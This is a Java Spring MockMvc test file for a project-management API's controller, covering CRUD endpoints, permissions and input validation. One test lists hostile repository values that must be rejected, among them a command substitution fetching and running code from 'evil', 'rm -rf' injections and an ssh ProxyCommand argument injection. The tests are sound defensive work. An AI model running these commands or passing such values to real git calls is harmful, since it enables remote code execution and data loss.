package com.workplace.project.controller;

import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.Mockito.doThrow;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.delete;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.patch;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.workplace.auth.repository.AgentApiKeyRepository;
import com.workplace.auth.repository.UserApiTokenRepository;
import com.workplace.global.dto.PageResponse;
import com.workplace.global.security.JwtProperties;
import com.workplace.global.security.JwtTokenProvider;
import com.workplace.permission.service.PermissionService;
import com.workplace.project.dto.CreateProjectRequest;
import com.workplace.project.dto.ProjectResponse;
import com.workplace.project.dto.UpdateProjectRequest;
import com.workplace.project.exception.ProjectAccessDeniedException;
import com.workplace.project.exception.ProjectConflictException;
import com.workplace.project.exception.ProjectNotFoundException;
import com.workplace.project.service.ProjectService;
import com.workplace.support.PermissionMocks;
import com.workplace.support.WebMvcSliceTestBase;
import com.workplace.tenant.repository.MembershipRepository;
import com.workplace.user.repository.UserRepository;
import java.time.Instant;
import java.util.List;
import java.util.Set;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.MediaType;
import org.springframework.test.web.servlet.MockMvc;

/** ProjectController @WebMvcTest. JWT/Permission 은 mock. */
@SuppressWarnings("null")
class ProjectControllerTest extends WebMvcSliceTestBase {

  @Autowired private MockMvc mockMvc;
  @Autowired private ObjectMapper objectMapper;

  @Autowired private ProjectService projectService;
  @Autowired private JwtTokenProvider jwtTokenProvider;
  @Autowired private JwtProperties jwtProperties;
  @Autowired private PermissionService permissionService;

  /** WP-420: JWT tenant 경로가 기존 getUserPermissions 스텁을 따르게 한다(PermissionMocks 참고). */
  @BeforeEach
  void mirrorActiveMemberPermissions() {
    PermissionMocks.mirrorActiveMember(permissionService);
  }

  @Autowired private MembershipRepository membershipRepository;

  @Autowired private AgentApiKeyRepository agentApiKeyRepository;
  @Autowired private UserApiTokenRepository userApiTokenRepository;

  @Autowired private UserRepository userRepository;

  /** valid-token 인증 + 주어진 권한 부여. */
  private void mockAuthentication(String... permissions) {
    when(jwtTokenProvider.validateAccessToken("valid-token")).thenReturn(true);
    when(jwtTokenProvider.getUserIdFromToken("valid-token")).thenReturn(1L);
    when(permissionService.getUserPermissions(1L)).thenReturn(Set.of(permissions));
  }

  private ProjectResponse sampleProject() {
    return new ProjectResponse(
        10L,
        "WP",
        "Workplace",
        "v1",
        1L,
        "TEAM",
        false,
        Instant.now(),
        Instant.now(),
        0,
        0,
        0,
        java.util.List.of(),
        true,
        "OWNER",
        null,
        null);
  }

  @Test
  void create_happyPath_returns200() throws Exception {
    mockAuthentication("project:write");
    when(projectService.create(eq(1L), any())).thenReturn(sampleProject());

    mockMvc
        .perform(
            post("/api/v1/projects")
                .header("Authorization", "Bearer valid-token")
                .contentType(MediaType.APPLICATION_JSON)
                .content(
                    objectMapper.writeValueAsString(
                        new CreateProjectRequest("WP", "Workplace", "v1"))))
        .andExpect(status().isOk())
        .andExpect(jsonPath("$.key").value("WP"));
  }

  @Test
  void create_personalWithoutKey_passesValidation_returns200() throws Exception {
    // PERSONAL 은 key 생략 가능 — @Valid 레이어가 400 으로 막지 않고 서비스까지 도달해야 한다.
    mockAuthentication("project:write");
    ProjectResponse personal =
        new ProjectResponse(
            11L,
            "P-1",
            "개인 작업",
            null,
            1L,
            "PERSONAL",
            false,
            Instant.now(),
            Instant.now(),
            0,
            0,
            0,
            java.util.List.of(),
            true,
            "OWNER",
            null,
            null);
    when(projectService.create(eq(1L), any())).thenReturn(personal);

    mockMvc
        .perform(
            post("/api/v1/projects")
                .header("Authorization", "Bearer valid-token")
                .contentType(MediaType.APPLICATION_JSON)
                .content(
                    objectMapper.writeValueAsString(
                        new CreateProjectRequest(null, "개인 작업", null, "PERSONAL"))))
        .andExpect(status().isOk())
        .andExpect(jsonPath("$.type").value("PERSONAL"));
  }

  @Test
  void create_invalidKeyPattern_returns400() throws Exception {
    // 소문자 key 는 패턴 위반 → Bean Validation 400
    mockAuthentication("project:write");

    mockMvc
        .perform(
            post("/api/v1/projects")
                .header("Authorization", "Bearer valid-token")
                .contentType(MediaType.APPLICATION_JSON)
                .content(
                    objectMapper.writeValueAsString(
                        new CreateProjectRequest("wp", "Workplace", "v1"))))
        .andExpect(status().isBadRequest());
  }

  @Test
  void create_duplicateKey_returns409() throws Exception {
    mockAuthentication("project:write");
    when(projectService.create(eq(1L), any()))
        .thenThrow(new ProjectConflictException("이미 사용 중인 key"));

    mockMvc
        .perform(
            post("/api/v1/projects")
                .header("Authorization", "Bearer valid-token")
                .contentType(MediaType.APPLICATION_JSON)
                .content(
                    objectMapper.writeValueAsString(
                        new CreateProjectRequest("WP", "Workplace", "v1"))))
        .andExpect(status().isConflict());
  }

  @Test
  void list_happyPath_returns200() throws Exception {
    mockAuthentication("project:read");
    PageResponse<ProjectResponse> page = new PageResponse<>(List.of(sampleProject()), 0, 20, 1, 1);
    when(projectService.list(1L, 0, 20)).thenReturn(page);

    mockMvc
        .perform(get("/api/v1/projects").header("Authorization", "Bearer valid-token"))
        .andExpect(status().isOk())
        .andExpect(jsonPath("$.content[0].key").value("WP"))
        .andExpect(jsonPath("$.totalElements").value(1));
  }

  /**
   * WP-644: size 상한 100 — 100 은 서비스까지 그대로 가고, 101 은 400(통합 테스트 ListSizeLimitIntegrationTest 와 짝).
   */
  @Test
  void list_size100_passes_size101_rejected() throws Exception {
    mockAuthentication("project:read");
    when(projectService.list(1L, 0, 100)).thenReturn(new PageResponse<>(List.of(), 0, 100, 0, 0));

    mockMvc
        .perform(
            get("/api/v1/projects")
                .header("Authorization", "Bearer valid-token")
                .param("size", "100"))
        .andExpect(status().isOk())
        .andExpect(jsonPath("$.size").value(100));
    mockMvc
        .perform(
            get("/api/v1/projects")
                .header("Authorization", "Bearer valid-token")
                .param("size", "101"))
        .andExpect(status().isBadRequest());
  }

  @Test
  void get_existingProject_returns200() throws Exception {
    mockAuthentication("project:read");
    when(projectService.get(1L, "WP")).thenReturn(sampleProject());

    mockMvc
        .perform(get("/api/v1/projects/WP").header("Authorization", "Bearer valid-token"))
        .andExpect(status().isOk())
        .andExpect(jsonPath("$.key").value("WP"));
  }

  @Test
  void get_unknownKey_returns404() throws Exception {
    mockAuthentication("project:read");
    when(projectService.get(1L, "XX")).thenThrow(new ProjectNotFoundException("XX"));

    mockMvc
        .perform(get("/api/v1/projects/XX").header("Authorization", "Bearer valid-token"))
        .andExpect(status().isNotFound());
  }

  @Test
  void get_notMember_returns403() throws Exception {
    mockAuthentication("project:read");
    when(projectService.get(1L, "WP")).thenThrow(new ProjectAccessDeniedException("멤버 아님"));

    mockMvc
        .perform(get("/api/v1/projects/WP").header("Authorization", "Bearer valid-token"))
        .andExpect(status().isForbidden());
  }

  @Test
  void update_happyPath_returns200() throws Exception {
    mockAuthentication("project:write");
    when(projectService.update(eq(1L), eq("WP"), any())).thenReturn(sampleProject());

    mockMvc
        .perform(
            patch("/api/v1/projects/WP")
                .header("Authorization", "Bearer valid-token")
                .contentType(MediaType.APPLICATION_JSON)
                .content(
                    objectMapper.writeValueAsString(
                        new UpdateProjectRequest("Updated", "new", null, null, null))))
        .andExpect(status().isOk())
        .andExpect(jsonPath("$.key").value("WP"));
  }

  /** WP-1011 — 저장소 주소는 https·ssh·git@ 만, 브랜치는 git 이름 글자만. 빈 값(지우기)은 통과. */
  @Test
  void update_repositoryFormat_validated() throws Exception {
    mockAuthentication("project:write");
    when(projectService.update(eq(1L), eq("WP"), any())).thenReturn(sampleProject());
    for (String bad :
        new String[] {
          "{\"repositoryUrl\":\"file:///etc/passwd\"}",
          "{\"repositoryUrl\":\"https://x.com/a b\"}",
          // 셸 글자 — AI 컴퓨터가 clone 명령으로 실행한다
          "{\"repositoryUrl\":\"https://x.com/$(curl evil|sh)\"}",
          "{\"repositoryUrl\":\"git@h.com:x;rm -rf ~\"}",
          "{\"repositoryUrl\":\"ssh://-oProxyCommand=x/a\"}",
          // 주소에 든 자격 증명 — 프로젝트를 보는 모두에게 보인다
          "{\"repositoryUrl\":\"https://user:ghp_tok@github.com/a/b.git\"}",
          "{\"repositoryBranch\":\"main; rm -rf\"}",
          "{\"repositoryBranch\":\"-x\"}",
          // git 이 브랜치 이름으로 받지 않는 것 — clone --branch 가 실패한다
          "{\"repositoryBranch\":\"feat..x\"}",
          "{\"repositoryBranch\":\"release/\"}",
          "{\"repositoryBranch\":\"a//b\"}",
          "{\"repositoryBranch\":\"main.lock\"}",
          "{\"repositoryBranch\":\".hidden\"}",
          "{\"repositoryUrl\":\"http://git.corp/a.git\"}"
        }) {
      mockMvc
          .perform(
              patch("/api/v1/projects/WP")
                  .header("Authorization", "Bearer valid-token")
                  .contentType(MediaType.APPLICATION_JSON)
                  .content(bad))
          .andExpect(status().isBadRequest());
    }
    for (String ok :
        new String[] {
          "{\"repositoryUrl\":\"git@github.com:acme/app.git\",\"repositoryBranch\":\"release/1.0\"}",
          "{\"repositoryUrl\":\"ssh://git@gitlab.example.com:2222/grp/sub/app.git\"}",
          "{\"repositoryUrl\":\"https://github.com/octocat/Hello-World.git\"}",
          // git@ 가 아닌 사용자·절대 경로의 scp 형식
          "{\"repositoryUrl\":\"deploy@git.corp:org/app.git\"}",
          "{\"repositoryUrl\":\"gitlab@git.corp:/srv/repo.git\"}",
          "{\"repositoryBranch\":\"feature/WP-1011_x.y\"}",
          "{\"repositoryUrl\":\"\",\"repositoryBranch\":\"\"}"
        }) {
      mockMvc
          .perform(
              patch("/api/v1/projects/WP")
                  .header("Authorization", "Bearer valid-token")
                  .contentType(MediaType.APPLICATION_JSON)
                  .content(ok))
          .andExpect(status().isOk());
    }
  }

  /** #858 — 부분 수정이라 name 은 생략할 수 있지만, 보낸다면 공백일 수 없다. */
  @Test
  void update_blankName_returns400() throws Exception {
    mockAuthentication("project:write");

    mockMvc
        .perform(
            patch("/api/v1/projects/WP")
                .header("Authorization", "Bearer valid-token")
                .contentType(MediaType.APPLICATION_JSON)
                .content("{\"name\":\"   \"}"))
        .andExpect(status().isBadRequest());
  }

  /** #858 — name 을 생략한 부분 수정도 유효한 요청이다. */
  @Test
  void update_withoutName_returns200() throws Exception {
    mockAuthentication("project:write");
    when(projectService.update(eq(1L), eq("WP"), any())).thenReturn(sampleProject());

    mockMvc
        .perform(
            patch("/api/v1/projects/WP")
                .header("Authorization", "Bearer valid-token")
                .contentType(MediaType.APPLICATION_JSON)
                .content("{\"description\":\"설명만\"}"))
        .andExpect(status().isOk());
  }

  @Test
  void delete_owner_returns204() throws Exception {
    mockAuthentication("project:manage");

    mockMvc
        .perform(delete("/api/v1/projects/WP").header("Authorization", "Bearer valid-token"))
        .andExpect(status().isNoContent());

    verify(projectService).softDelete(1L, "WP");
  }

  @Test
  void delete_withoutManagePermission_returns403() throws Exception {
    // manage 권한 없음 → @RequirePermission 차단
    mockAuthentication("project:read");
    // 서비스가 호출되지 않도록 사전에 throw 시켜도 됨 — but interceptor 가 먼저 차단해야 한다
    doThrow(new IllegalStateException("should not be called"))
        .when(projectService)
        .softDelete(any(), any());

    mockMvc
        .perform(delete("/api/v1/projects/WP").header("Authorization", "Bearer valid-token"))
        .andExpect(status().isForbidden());
  }
}
